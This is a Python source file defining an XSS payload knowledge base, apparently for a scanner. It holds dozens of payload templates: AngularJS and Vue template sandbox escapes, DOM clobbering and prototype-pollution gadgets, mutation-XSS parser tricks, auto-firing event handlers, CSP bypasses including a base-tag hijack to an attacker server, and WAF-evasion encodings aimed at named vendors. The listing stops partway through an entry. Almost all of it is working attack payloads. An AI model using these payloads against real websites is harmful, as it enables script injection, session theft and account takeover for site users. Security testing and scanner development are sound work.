"""
Payload Knowledge Base - Comprehensive repository of modern XSS research,
exploitation vectors, bypass primitives, client-side gadgets, and mutation taxonomies.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set


class XSSCategory(str, Enum):
    """Categorization of XSS vulnerability and exploitation classes."""
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"
    MUTATION_XSS = "mutation_xss"
    CLIENT_TEMPLATE_INJECTION = "csti"
    DOM_CLOBBERING = "dom_clobbering"
    PROTOTYPE_POLLUTION = "prototype_pollution"
    CSP_BYPASS = "csp_bypass"
    WAF_EVASION = "waf_evasion"
    CHAR_RESTRICTED = "char_restricted"
    BLIND_OUT_OF_BAND = "blind_oob"
    FRAMEWORK_SPECIFIC = "framework_specific"


class InjectionContext(str, Enum):
    """Context where the user payload is reflected or evaluated."""
    HTML_TEXT = "HTML_TEXT"
    ATTR_QUOTED_DOUBLE = "ATTR_QUOTED_DOUBLE"
    ATTR_QUOTED_SINGLE = "ATTR_QUOTED_SINGLE"
    ATTR_UNQUOTED = "ATTR_UNQUOTED"
    ATTR_BACKTICK = "ATTR_BACKTICK"
    EVENT_HANDLER_ATTR = "EVENT_HANDLER_ATTR"
    JS_STRING_DOUBLE = "JS_STRING_DOUBLE"
    JS_STRING_SINGLE = "JS_STRING_SINGLE"
    JS_TEMPLATE_LITERAL = "JS_TEMPLATE_LITERAL"
    JS_IDENTIFIER = "JS_IDENTIFIER"
    JS_BLOCK = "JS_BLOCK"
    JSON_VALUE = "JSON_VALUE"
    JSON_KEY = "JSON_KEY"
    URL_HREF = "URL_HREF"
    URL_SRC = "URL_SRC"
    URL_QUERY = "URL_QUERY"
    URL_FRAGMENT = "URL_FRAGMENT"
    CSS_PROPERTY = "CSS_PROPERTY"
    CSS_URL = "CSS_URL"
    SVG_NAMESPACE = "SVG_NAMESPACE"
    MATHML_NAMESPACE = "MATHML_NAMESPACE"
    MARKDOWN_RENDERER = "MARKDOWN_RENDERER"
    RICH_TEXT_HTML = "RICH_TEXT_HTML"
    COMMENT_BLOCK = "COMMENT_BLOCK"


@dataclass
class PayloadEntry:
    """A structured entry in the XSS knowledge base."""
    id: str
    name: str
    template: str
    category: XSSCategory
    contexts: List[InjectionContext]
    description: str
    tags: List[str] = field(default_factory=list)
    frameworks: List[str] = field(default_factory=list)
    bypasses_wafs: List[str] = field(default_factory=list)
    blocked_chars_tolerated: Set[str] = field(default_factory=set)
    required_chars: Set[str] = field(default_factory=set)
    remediation: str = ""
    cwe_id: int = 79
    cvss_score: float = 7.5


class PayloadKnowledgeBase:
    """
    State-of-the-art knowledge repository for Cross-Site Scripting.
    Provides query engines, classification filters, and gadget resolvers.
    """

    ENTRIES: List[PayloadEntry] = [
        # =========================================================================
        # 1. CLIENT-SIDE TEMPLATE INJECTION (CSTI)
        # =========================================================================
        PayloadEntry(
            id="csti_angularjs_1_6_sandbox_escape",
            name="AngularJS 1.6+ Sandbox Escape",
            template="{{constructor.constructor('__XSS__(\"{{TOKEN}}\")')()}}",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.RICH_TEXT_HTML],
            description="AngularJS client-side template expression breaking sandbox via Function constructor.",
            tags=["csti", "angularjs", "sandbox_escape", "modern"],
            frameworks=["angularjs", "angular"],
            cwe_id=79,
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="csti_angularjs_1_5_all_versions",
            name="AngularJS 1.5.0-1.5.8 Sandbox Escape",
            template="{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=1} } };__XSS__(\"{{TOKEN}}\");//');}}",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT],
            description="AngularJS 1.5.x sandbox bypass modifying String.prototype.charAt to empty join.",
            tags=["csti", "angularjs", "sandbox_bypass"],
            frameworks=["angularjs"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="csti_angularjs_1_4_all_versions",
            name="AngularJS 1.4.0-1.4.9 Sandbox Escape",
            template="1|toString().constructor.prototype.toString=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,95,95,88,83,83,95,95,40,39,123,123,84,79,75,69,78,125,125,39,41)",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT],
            description="AngularJS 1.4.x sandbox escape via orderBy filter and String.fromCharCode code generation.",
            tags=["csti", "angularjs", "orderby_filter"],
            frameworks=["angularjs"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="csti_angularjs_1_2_1_3_sandbox_escape",
            name="AngularJS 1.2-1.3 Sandbox Escape",
            template="{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,__XSS__(\"{{TOKEN}}\"),a')}}",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT],
            description="AngularJS 1.2-1.3 sandbox escape via prototype charAt modification and $eval injection.",
            tags=["csti", "angularjs", "prototype_tampering"],
            frameworks=["angularjs"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="csti_angularjs_ng_controller_eval",
            name="AngularJS Controller Eval Injection",
            template="<div ng-controller=\"a\">{{$eval.constructor('__XSS__(\"{{TOKEN}}\")')()}}</div>",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT],
            description="AngularJS scope injection invoking constructor on scope evaluation functions.",
            tags=["csti", "angularjs", "ng_controller"],
            frameworks=["angularjs"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="csti_vuejs_2_client_render",
            name="Vue.js 2.x Template Injection",
            template="{{_c.constructor('__XSS__(\"{{TOKEN}}\")')()}}",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Vue.js 2 client-side template compiler injection accessing _c (createElement) constructor.",
            tags=["csti", "vuejs", "vue2"],
            frameworks=["vue", "vuejs", "nuxt"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="csti_vuejs_3_template_injection",
            name="Vue.js 3.x Client Template Injection",
            template="{{_ctx.constructor.constructor('__XSS__(\"{{TOKEN}}\")')()}}",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Vue.js 3 client-side compiler injection using instance render context _ctx.",
            tags=["csti", "vuejs", "vue3"],
            frameworks=["vue", "vuejs", "nuxt"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="csti_alpine_js_x_data_eval",
            name="Alpine.js Directive Injection",
            template="<div x-data x-init=\"$el.ownerDocument.defaultView.__XSS__('{{TOKEN}}')\"></div>",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Alpine.js reactive directive injection in x-init hook accessing window view.",
            tags=["csti", "alpinejs", "x_init"],
            frameworks=["alpinejs", "alpine"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="csti_svelte_hydration_escape",
            name="Svelte Client Hydration Escape",
            template="<script>__XSS__('{{TOKEN}}')</script>",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Svelte unescaped SSR-to-client hydration bypass using raw html tag rendering.",
            tags=["csti", "svelte", "hydration"],
            frameworks=["svelte", "sveltekit"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="csti_handlebars_helper_escape",
            name="Handlebars Client-Side Helper Escape",
            template="{{#with \"constructor\"}}{{#with split}}{{pop (push \"__XSS__('{{TOKEN}}')\")}}{{/with}}{{/with}}",
            category=XSSCategory.CLIENT_TEMPLATE_INJECTION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Handlebars client-side template expression breaking sandbox via helper chaining.",
            tags=["csti", "handlebars"],
            frameworks=["handlebars", "ember"],
            cvss_score=8.2,
        ),

        # =========================================================================
        # 2. DOM CLOBBERING GADGETS
        # =========================================================================
        PayloadEntry(
            id="dom_clobber_window_config_url",
            name="DOM Clobbering window.config.url",
            template="<form id=\"config\"><input name=\"url\" value=\"javascript:__XSS__('{{TOKEN}}')\"></form>",
            category=XSSCategory.DOM_CLOBBERING,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.RICH_TEXT_HTML],
            description="Clobbers window.config with a FormElement and config.url with an HTMLInputElement pointing to javascript: URI.",
            tags=["dom_clobbering", "window_config", "multi_level"],
            cwe_id=79,
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="dom_clobber_config_url_entity_quoteless",
            name="Quoteless Entity-Encoded window.config.url Clobber",
            template="<a id=config><a id=config name=url href=&#106;ava&#115;cript:parent.__XSS__&#40;&#39;{{TOKEN}}&#39;&#41;>",
            category=XSSCategory.DOM_CLOBBERING,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.RICH_TEXT_HTML],
            description="Clobbers a nested window.config.url lookup while numeric entities keep the executable URL free of raw quotes, parentheses, slashes, and the javascript keyword.",
            tags=["dom_clobbering", "window_config", "numeric_entities", "char_restricted"],
            cwe_id=79,
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="dom_clobber_form_name_hierarchy",
            name="DOM Clobbering Named Form Element Array",
            template="<form id=\"authConfig\"><a id=\"authConfig\" name=\"targetUrl\" href=\"javascript:__XSS__('{{TOKEN}}')\"></a></form>",
            category=XSSCategory.DOM_CLOBBERING,
            contexts=[InjectionContext.HTML_TEXT],
            description="Clobbers hierarchical object property window.authConfig.targetUrl with an HTMLAnchorElement.",
            tags=["dom_clobbering", "anchor_element", "form_hierarchy"],
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="dom_clobber_document_getelementbyid",
            name="DOM Clobbering document.getElementById Cache",
            template="<img id=\"defaultSettings\" name=\"defaultSettings\" src=\"x\" onerror=\"__XSS__('{{TOKEN}}')\">",
            category=XSSCategory.DOM_CLOBBERING,
            contexts=[InjectionContext.HTML_TEXT],
            description="Clobbers named document property and fires inline execution on media error.",
            tags=["dom_clobbering", "document_scope"],
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="dom_clobber_webpack_chunk_loader",
            name="DOM Clobbering Webpack Chunk Loader",
            template="<form id=\"webpackChunk\"><input name=\"push\" value=\"\" /></form><script>__XSS__('{{TOKEN}}')</script>",
            category=XSSCategory.DOM_CLOBBERING,
            contexts=[InjectionContext.HTML_TEXT],
            description="Clobbers window.webpackChunk array pushing behavior causing fallback script evaluation.",
            tags=["dom_clobbering", "webpack", "bundler"],
            frameworks=["webpack", "react", "vue"],
            cvss_score=8.1,
        ),
        PayloadEntry(
            id="dom_clobber_dompurify_sanitize_hook",
            name="DOM Clobbering DOMPurify sanitize DOM node attributes",
            template="<form id=\"attributes\"><input name=\"id\" value=\"__XSS__('{{TOKEN}}')\"/></form>",
            category=XSSCategory.DOM_CLOBBERING,
            contexts=[InjectionContext.HTML_TEXT],
            description="Clobbers element.attributes in DOMPurify or custom sanitizers allowing malicious node pass-through.",
            tags=["dom_clobbering", "sanitizer_bypass", "dompurify"],
            cvss_score=8.4,
        ),

        # =========================================================================
        # 3. CLIENT-SIDE PROTOTYPE POLLUTION TO XSS GADGETS
        # =========================================================================
        PayloadEntry(
            id="pp_jquery_html_prefilter",
            name="Prototype Pollution to jQuery htmlPrefilter Gadget",
            template="__proto__[htmlPrefilter]=<img src=x onerror=__XSS__('{{TOKEN}}')>",
            category=XSSCategory.PROTOTYPE_POLLUTION,
            contexts=[InjectionContext.URL_QUERY, InjectionContext.JSON_VALUE],
            description="Pollutes Object.prototype.htmlPrefilter executed during jQuery DOM manipulation ($('div').html(...)).",
            tags=["prototype_pollution", "jquery", "gadget"],
            frameworks=["jquery"],
            cvss_score=8.5,
        ),
        PayloadEntry(
            id="pp_lodash_template_source_url",
            name="Prototype Pollution to Lodash Template Gadget",
            template="__proto__[sourceURL]=\n__XSS__('{{TOKEN}}');//",
            category=XSSCategory.PROTOTYPE_POLLUTION,
            contexts=[InjectionContext.URL_QUERY, InjectionContext.JSON_VALUE],
            description="Pollutes Object.prototype.sourceURL injected directly into lodash _.template Function constructor.",
            tags=["prototype_pollution", "lodash", "template_gadget"],
            frameworks=["lodash", "underscore"],
            cvss_score=8.8,
        ),
        PayloadEntry(
            id="pp_gtm_custom_script_gadget",
            name="Prototype Pollution to Google Tag Manager Script Gadget",
            template="__proto__[customScripts]=javascript:__XSS__('{{TOKEN}}')",
            category=XSSCategory.PROTOTYPE_POLLUTION,
            contexts=[InjectionContext.URL_QUERY, InjectionContext.JSON_VALUE],
            description="Pollutes customScripts property read by Google Tag Manager/Analytics containers.",
            tags=["prototype_pollution", "gtm", "analytics"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="pp_dompurify_allowed_tags",
            name="Prototype Pollution to DOMPurify Config Gadget",
            template="__proto__[ALLOWED_TAGS][]=script&__proto__[ALLOWED_ATTR][]=onload",
            category=XSSCategory.PROTOTYPE_POLLUTION,
            contexts=[InjectionContext.URL_QUERY, InjectionContext.JSON_VALUE],
            description="Pollutes default configuration objects of DOMPurify, enabling script and event handlers.",
            tags=["prototype_pollution", "dompurify", "sanitizer_bypass"],
            cvss_score=8.7,
        ),
        PayloadEntry(
            id="pp_nextjs_script_loader_gadget",
            name="Prototype Pollution to Next.js Hydration Loader",
            template="__proto__[src]=data:text/javascript,__XSS__('{{TOKEN}}')",
            category=XSSCategory.PROTOTYPE_POLLUTION,
            contexts=[InjectionContext.URL_QUERY, InjectionContext.JSON_VALUE],
            description="Pollutes next/script or next/dynamic lazy loader script source.",
            tags=["prototype_pollution", "nextjs", "react"],
            frameworks=["nextjs", "react"],
            cvss_score=8.5,
        ),
        PayloadEntry(
            id="pp_react_rsc_server_component_deser",
            name="Prototype Pollution React RSC Component Deserialization",
            template="{\"__proto__\":{\"type\":\"script\",\"props\":{\"dangerouslySetInnerHTML\":{\"__html\":\"__XSS__('{{TOKEN}}')\"}}}}",
            category=XSSCategory.PROTOTYPE_POLLUTION,
            contexts=[InjectionContext.JSON_VALUE],
            description="Pollutes React Server Components (RSC) client-side deserialization tree with raw executable HTML element.",
            tags=["prototype_pollution", "react_rsc", "nextjs"],
            frameworks=["react", "nextjs"],
            cvss_score=8.8,
        ),

        # =========================================================================
        # 4. MUTATION XSS (mXSS) & PARSER DIFFERENTIALS
        # =========================================================================
        PayloadEntry(
            id="mxss_math_annotation_xml_differential",
            name="mXSS MathML Annotation-XML Namespace Switching",
            template="<math><annotation-xml encoding=\"text/html\"><svg><desc><style>&lt;/style&gt;&lt;img src=x onerror=__XSS__('{{TOKEN}}')&gt;</style></desc></svg></annotation-xml></math>",
            category=XSSCategory.MUTATION_XSS,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.RICH_TEXT_HTML],
            description="Exploits parser differential when transitioning from MathML annotation-xml back to HTML context.",
            tags=["mxss", "mathml", "annotation_xml", "sanitizer_bypass"],
            cvss_score=8.6,
        ),
        PayloadEntry(
            id="mxss_math_table_a_tag_mutation",
            name="mXSS MathML Table Fostered Tag Mutation",
            template="<math><mtext><table><a href=\"&lt;/table&gt;&lt;img src=x onerror=__XSS__('{{TOKEN}}')&gt;\">",
            category=XSSCategory.MUTATION_XSS,
            contexts=[InjectionContext.HTML_TEXT],
            description="Exploits HTML5 foster parenting inside MathML mtext where table tags are ejected and mutated.",
            tags=["mxss", "foster_parenting", "table_mutation"],
            cvss_score=8.6,
        ),
        PayloadEntry(
            id="mxss_svg_foreignobject_xhtml",
            name="mXSS SVG ForeignObject Namespace Re-entry",
            template="<svg><foreignObject><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"refresh\" content=\"0;url=javascript:__XSS__('{{TOKEN}}')\"/></head></html></foreignObject></svg>",
            category=XSSCategory.MUTATION_XSS,
            contexts=[InjectionContext.HTML_TEXT],
            description="Uses SVG foreignObject to nest a full XHTML document containing a meta-refresh javascript execution vector.",
            tags=["mxss", "svg", "foreignobject", "meta_refresh"],
            cvss_score=8.4,
        ),
        PayloadEntry(
            id="mxss_noscript_p_mutation",
            name="mXSS Noscript Mutation Differential",
            template="<noscript><p title=\"&lt;/noscript&gt;&lt;img src=x onerror=__XSS__('{{TOKEN}}')&gt;\"></p></noscript>",
            category=XSSCategory.MUTATION_XSS,
            contexts=[InjectionContext.HTML_TEXT],
            description="Exploits parser difference between scripting-enabled and scripting-disabled parsing modes in sanitizers.",
            tags=["mxss", "noscript", "parser_differential"],
            cvss_score=8.4,
        ),
        PayloadEntry(
            id="mxss_form_math_mglyph_roundtrip",
            name="mXSS Form Math Mglyph Round-Trip Confusion",
            template="<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=__XSS__('{{TOKEN}}')>",
            category=XSSCategory.MUTATION_XSS,
            contexts=[InjectionContext.HTML_TEXT],
            description="Exploits form nesting rules inside MathML causing innerHTML serializer to output unescaped executable img tag.",
            tags=["mxss", "form_nesting", "innerhtml_roundtrip"],
            cvss_score=8.6,
        ),

        # =========================================================================
        # 5. MODERN BROWSER EVENT HANDLERS & HTML5/HTML6 VECTORS
        # =========================================================================
        PayloadEntry(
            id="event_details_ontoggle",
            name="HTML5 Details Open Ontoggle Auto-trigger",
            template="<details open ontoggle=\"__XSS__('{{TOKEN}}')\">",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Details element with open attribute triggers ontoggle immediately without user interaction.",
            tags=["event_handler", "html5", "zero_interaction", "details"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="event_unquoted_attr_autofocus",
            name="Unquoted Attribute Autofocus Breakout",
            template="x tabindex=0 autofocus onfocus=__XSS__('{{TOKEN}}')",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.ATTR_UNQUOTED],
            description="Terminates an unquoted attribute with whitespace and adds a focusable autofocus event target.",
            tags=["event_handler", "attribute_breakout", "unquoted", "zero_interaction"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="event_input_content_visibility",
            name="Content-Visibility Auto State Change Event",
            template="<input type=\"hidden\" oncontentvisibilityautostatechange=\"__XSS__('{{TOKEN}}')\" style=\"content-visibility:auto\">",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Modern Chromium event fired automatically upon render of content-visibility:auto element.",
            tags=["event_handler", "chromium", "modern_css", "content_visibility"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="event_dialog_open_onclose",
            name="HTML5 Dialog Open Autofocus Trigger",
            template="<dialog open onfocusin=\"__XSS__('{{TOKEN}}')\" tabindex=\"0\" autofocus></dialog>",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="HTML5 dialog element automatically focused on load triggering onfocusin handler.",
            tags=["event_handler", "dialog", "autofocus"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="event_marquee_onstart",
            name="Marquee Tag onstart Execution",
            template="<marquee onstart=\"__XSS__('{{TOKEN}}')\"></marquee>",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Legacy and modern-compatible marquee tag triggering onstart on first loop frame.",
            tags=["event_handler", "marquee"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="event_svg_animate_onbegin",
            name="SVG SMIL Animate onbegin Execution",
            template="<svg><animate onbegin=\"__XSS__('{{TOKEN}}')\" attributeName=\"x\" dur=\"1s\"></svg>",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE],
            description="SVG SMIL animation element triggering onbegin immediately when timeline starts.",
            tags=["event_handler", "svg", "smil", "onbegin"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="event_svg_set_onbegin",
            name="SVG SMIL Set onbegin Execution",
            template="<svg><set onbegin=\"__XSS__('{{TOKEN}}')\" attributeName=\"x\" to=\"y\"></svg>",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE],
            description="SVG set element executing javascript immediately upon start of the timeline.",
            tags=["event_handler", "svg", "smil"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="event_audio_video_source_onerror",
            name="HTML5 Media Source onerror Trigger",
            template="<video><source onerror=\"__XSS__('{{TOKEN}}')\"></video>",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Media source tag triggering onerror handler when missing valid source URL.",
            tags=["event_handler", "media", "source_onerror"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="event_form_oninvalid_autofocus",
            name="HTML5 Form Validation oninvalid Autofocus Trigger",
            template="<form><input required oninvalid=\"__XSS__('{{TOKEN}}')\" autofocus><button>x</button></form>",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Required form field invalidation firing oninvalid automatically during form verification.",
            tags=["event_handler", "form_validation", "oninvalid"],
            cvss_score=7.5,
        ),

        # =========================================================================
        # 6. CSP (CONTENT SECURITY POLICY) BYPASSES
        # =========================================================================
        PayloadEntry(
            id="csp_jsonp_google_apis_bypass",
            name="CSP Script-Src JSONP Bypass (Google APIs)",
            template="<script src=\"https://www.google.com/complete/search?client=chrome&q=x&jsonp=__XSS__('{{TOKEN}}')\"></script>",
            category=XSSCategory.CSP_BYPASS,
            contexts=[InjectionContext.HTML_TEXT],
            description="Bypasses CSP whitelisting google.com or *.google.com via search JSONP callback.",
            tags=["csp_bypass", "jsonp", "google_apis"],
            cvss_score=8.5,
        ),
        PayloadEntry(
            id="csp_jsonp_cloudflare_cdnjs_angular",
            name="CSP Script-Src CDN Angular Gadget Loader",
            template="<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\"></script><div ng-app>{{constructor.constructor('__XSS__(\"{{TOKEN}}\")')()}}</div>",
            category=XSSCategory.CSP_BYPASS,
            contexts=[InjectionContext.HTML_TEXT],
            description="Bypasses script-src whitelisting cdnjs.cloudflare.com by loading AngularJS and executing client-side template expression.",
            tags=["csp_bypass", "cdn_gadget", "angular_loader"],
            cvss_score=8.8,
        ),
        PayloadEntry(
            id="csp_base_uri_missing_hijack",
            name="CSP Base-URI Missing Base Tag Hijacking",
            template="<base href=\"//attacker.controlled.server/\">",
            category=XSSCategory.CSP_BYPASS,
            contexts=[InjectionContext.HTML_TEXT],
            description="Hijacks relative script imports when CSP lacks the base-uri directive.",
            tags=["csp_bypass", "base_uri", "relative_import"],
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="csp_strict_dynamic_dom_loader_hijack",
            name="CSP Strict-Dynamic Script Insertion Bypass",
            template="<script>var s=document.createElement('script');s.src='data:text/javascript,__XSS__(\"{{TOKEN}}\")';document.body.appendChild(s);</script>",
            category=XSSCategory.CSP_BYPASS,
            contexts=[InjectionContext.JS_BLOCK, InjectionContext.JS_STRING_DOUBLE],
            description="Exploits trust propagation in 'strict-dynamic' when dynamic script elements inherit loader authorization.",
            tags=["csp_bypass", "strict_dynamic", "script_injection"],
            cvss_score=8.5,
        ),
        PayloadEntry(
            id="csp_iframe_srcdoc_script_execution",
            name="CSP Iframe SrcDoc Sandbox Escape",
            template="<iframe srcdoc=\"&lt;script&gt;parent.__XSS__('{{TOKEN}}')&lt;/script&gt;\"></iframe>",
            category=XSSCategory.CSP_BYPASS,
            contexts=[InjectionContext.HTML_TEXT],
            description="Executes script inside iframe srcdoc inheriting or bypassing certain outer page policy restrictions.",
            tags=["csp_bypass", "iframe_srcdoc"],
            cvss_score=7.8,
        ),

        # =========================================================================
        # 7. PARENTHESELESS, BRACKETLESS & CHARACTER-RESTRICTED EXECUTION
        # =========================================================================
        PayloadEntry(
            id="no_parens_onerror_throw",
            name="Parentheseless Execution via onerror and throw",
            template="<img src=x onerror=\"window.onerror=eval;throw'=__XSS__(\\\'{{TOKEN}}\\\')'\">",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.ATTR_QUOTED_DOUBLE],
            description="Executes arbitrary JavaScript string without using parentheses by setting window.onerror to eval.",
            tags=["char_restricted", "no_parentheses", "onerror_throw"],
            blocked_chars_tolerated={"(", ")"},
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="no_parens_template_literals",
            name="Parentheseless Execution via Tagged Template Literals",
            template="<svg onload=\"__XSS__`{{TOKEN}}`\">",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Invokes target function with template literal backticks instead of parentheses.",
            tags=["char_restricted", "tagged_templates", "no_parentheses"],
            blocked_chars_tolerated={"(", ")"},
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="no_parens_quotes_details_tagged_template",
            name="Quote-Free Parentheseless Details Tagged Template",
            template="<details open ontoggle=__XSS__`{{TOKEN}}`>",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Uses an auto-triggering details event and a tagged template call when quotes and parentheses are unavailable.",
            tags=["char_restricted", "no_parentheses", "no_quotes", "zero_interaction"],
            blocked_chars_tolerated={"(", ")", "'", '"'},
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="no_quotes_string_fromcharcode",
            name="Quoteless Execution via String.fromCharCode",
            template="<img src=x onerror=\"eval(String.fromCharCode(95,95,88,83,83,95,95,40,39,123,123,84,79,75,69,78,125,125,39,41))\">",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.ATTR_UNQUOTED],
            description="Constructs script string dynamically via ASCII integer character codes without quotes.",
            tags=["char_restricted", "quoteless", "fromcharcode"],
            blocked_chars_tolerated={"'", "\"", "`"},
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="no_spaces_slash_delimiter",
            name="Spaceless Payload via Slash Delimiters",
            template="<svg/onload=__XSS__('{{TOKEN}}')>",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Replaces standard whitespace with forward slashes acceptable in HTML parser tokenization.",
            tags=["char_restricted", "spaceless", "slash_delimiter"],
            blocked_chars_tolerated={" ", "\t", "\n"},
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="no_angle_brackets_attribute_breakout",
            name="Bracketless Event Injection in Quoted Attribute",
            template="\" autofocus onfocus=\"__XSS__('{{TOKEN}}')\" x=\"",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.ATTR_QUOTED_DOUBLE],
            description="Injects event handler inside double-quoted attribute without requiring angle brackets < >.",
            tags=["char_restricted", "no_angle_brackets", "attribute_injection"],
            blocked_chars_tolerated={"<", ">"},
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="no_angle_brackets_single_quoted_breakout",
            name="Bracketless Event Injection in Single-Quoted Attribute",
            template="' autofocus onfocus='__XSS__(\"{{TOKEN}}\")' x='",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.ATTR_QUOTED_SINGLE],
            description="Injects event handler inside single-quoted attribute without requiring angle brackets < >.",
            tags=["char_restricted", "no_angle_brackets", "attribute_injection"],
            blocked_chars_tolerated={"<", ">"},
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="no_angle_brackets_js_string_breakout",
            name="Bracketless JS String Literal Breakout",
            template="\";__XSS__('{{TOKEN}}');//",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.JS_STRING_DOUBLE],
            description="Breaks out of JS double quote string and executes statement without requiring HTML tags.",
            tags=["char_restricted", "no_angle_brackets", "js_breakout"],
            blocked_chars_tolerated={"<", ">"},
            cvss_score=7.5,
        ),

        # =========================================================================
        # 8. WAF EVASION & FILTER BYPASS TECHNIQUES
        # =========================================================================
        PayloadEntry(
            id="waf_unicode_nfkc_normalization",
            name="WAF Bypass via Unicode NFKC Normalization",
            template="\uff1cscript\uff1e__XSS__('{{TOKEN}}')\uff1c/script\uff1e",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Uses full-width Unicode characters (＜ ＞) normalized to standard ASCII brackets by backend string filters.",
            tags=["waf_evasion", "unicode_normalization", "nfkc"],
            bypasses_wafs=["cloudflare", "aws_waf", "modsecurity"],
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="waf_html5_named_entities_colon_tab",
            name="WAF Bypass via HTML5 Named Entity Resolution",
            template="<a href=\"jav&Tab;ascript&colon;__XSS__('{{TOKEN}}')\">click</a>",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.URL_HREF],
            description="Uses HTML5 named entities &Tab; and &colon; to disrupt WAF regex pattern matching for javascript: URIs.",
            tags=["waf_evasion", "html_entities", "tab_colon"],
            bypasses_wafs=["cloudflare", "akamai", "imperva"],
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="waf_comment_interspersed_script_tag",
            name="WAF Bypass via Multi-line Comment Interspersing",
            template="<script/**/type=\"text/javascript\">__XSS__('{{TOKEN}}')</script>",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Injects C-style comment tokens inside tag definitions to defeat strict whitespace-based WAF signatures.",
            tags=["waf_evasion", "comment_interspersing"],
            bypasses_wafs=["modsecurity", "f5_big_ip"],
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="waf_svg_foreignobject_nested_xml",
            name="WAF Bypass via Nested SVG / XML Entities",
            template="<svg><![CDATA[><script>__XSS__('{{TOKEN}}')</script>]]></svg>",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Uses XML CDATA blocks inside SVG to disguise executable script elements from inspective filters.",
            tags=["waf_evasion", "cdata", "svg_namespace"],
